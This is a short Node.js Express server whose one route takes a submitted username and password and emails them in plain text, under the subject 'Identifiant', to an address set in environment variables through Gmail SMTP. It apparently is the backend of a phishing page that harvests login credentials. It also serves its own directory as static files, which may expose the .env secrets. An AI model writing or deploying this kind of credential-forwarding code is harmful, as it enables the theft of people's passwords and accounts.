const express = require('express');
const nodemailer = require('nodemailer');
require('dotenv').config();

const app = express()

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', 'http://localhost:5000')
    res.setHeader('Access-Control-Allow-Credentials', 'true')
    res.setHeader('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content, Accept, Content-Type, Authorization')
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS')
    next()
  });

app.use(express.json());
app.use(express.urlencoded({
  extended: true
}))

app.use(express.static('./'));


app.post('/send', async (req, res) => {
  try{
    var transporter = nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 587,
        secure: false, // true for 465, false for other ports
        auth: {
          user: process.env.EMAIL, // generated ethereal user
          pass: process.env.PASSWORD, // generated ethereal password
        },
      });

    await transporter.sendMail({
    from: process.env.EMAIL, // sender address
    to: process.env.DESTINATION, // list of receivers
    subject: "Identifiant", // Subject line
    text: "Username : " + req.body.username + "\n" + "Password : " + req.body.password, // plain text body
    });

    res.status(200).send('Operation realisé')
  }catch{
    res.status(400).send('Erreur')
  }

})

module.exports = app;